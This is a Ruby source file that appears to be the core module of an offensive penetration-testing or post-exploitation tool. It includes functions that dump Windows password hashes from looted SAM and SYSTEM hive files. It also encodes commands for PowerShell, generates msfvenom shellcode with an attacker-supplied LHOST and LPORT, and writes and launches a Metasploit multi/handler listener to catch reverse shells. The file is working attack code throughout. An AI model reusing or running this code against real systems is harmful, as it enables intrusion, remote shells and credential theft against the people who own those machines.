#!/usr/bin/env ruby
require 'base64'
require 'openssl'
require 'fileutils'
require 'open3'
require 'readline'
module Core
  module Commands
    def print_error(text)
      puts "\e[31;1m[-]\e[0m #{text}"
    end

    def print_info(text)
      puts "\e[34;1m[*]\e[0m #{text}"
    end

    def print_success(text)
      puts "\e[32;1m[+]\e[0m #{text}"
    end

    def rgets(prompt = ' ', default_value = '')
      line = Readline.readline(prompt, false)
      line = default_value if line.empty?
      line
    end

    def print_hashes(x)
      samdump_path, samdump_status = Open3.capture2('which samdump2')
      bkhive_path, bkhive_status = Open3.capture2('which bkhive')
      print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /exit 1/
      print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /exit 1/
      if samdump_status.to_s =~ /exit 0/ and bkhive_status.to_s =~ /exit 0/
        Open3.capture2("#{bkhive_path.chomp} #{loot_dir}sys#{x} #{loot_dir}sys_key#{x}.txt")
        sam_dump,sam_exit = Open3.capture2("#{samdump_path.chomp} #{loot_dir}sam#{x} #{loot_dir}sys_key#{x}.txt")
        print_success("Printing Hashes!\n")
        puts sam_dump
        File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
      else
        print_error("Can't dump local hashes!\n")
      end
    end
  end

  module Msf
    def encode_command(command)
      Base64.encode64(command.encode('utf-16le')).delete("\r\n")
    end

    def random_name_gen
      random_length = rand(4..8)
      file_name = random_length.to_i.times.map do
        [*'a'..'z', *'A'..'Z', *'0'..'9'].sample
      end.join
      file_name
    end

    def hex_to_bin(file_name, hex_string)
      File.open(file_name, 'w') do |f|
        f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))
      end
    end

    def bin_to_hex(file)
      bin_file = File.open(file, 'rb').read
      bin_file.unpack('H*').first
    end

    class MsfCommands
      def generate_shellcode(host, port, payload)
        if File.exist?('/usr/bin/msfvenom')
          @msf_path = '/usr/bin/'
        elsif File.exist?('/opt/metasploit-framework/msfvenom')
          @msf_path = ('/opt/metasploit-framework/')
        else
          print_error('Metasploit Not Found!')
          exit
        end
        @set_payload = payload
        print_info('Generating shellcode')
        cmd = "#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} "
        cmd << "LPORT=#{port} -f C"
        execute  = `#{cmd}`
        print_success('Shellcode Generated')
        clean_shellcode(execute)
      end

      def metasploit_setup(host, port)
        unless Dir.exist?(file_root + '/metaspoit_files/')
          Dir.mkdir(file_root + '/metaspoit_files/')
        end
        file_path = file_root + '/metaspoit_files/'
        rc_file = 'msf_listener.rc'
        write_rc(file_path, rc_file, host, port)
        print_info("Setting up Metasploit this may take a moment\n")
        system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
      end

      private

      def clean_shellcode(shellcode)
        shellcode = shellcode.gsub('\\', ',0')
        shellcode = shellcode.delete('+')
        shellcode = shellcode.delete('"')
        shellcode = shellcode.delete("\n")
        shellcode = shellcode.delete("\s")
        shellcode[0..4] = ''
        shellcode
      end

      def write_rc(file_path, rc_file, host, port)
        file = File.open("#{file_path}#{rc_file}", 'w')
        file.write("use exploit/multi/handler\n")
        file.write("set PAYLOAD #{@set_payload}\n")
        file.write("set LHOST #{host}\n")
        file.write("set LPORT #{port}\n")
        file.write("set EnableStageEncoding true\n")
        file.write("set ExitOnSession false\n")
        file.write('exploit -j')
        file.close
      end
    end
  end
end
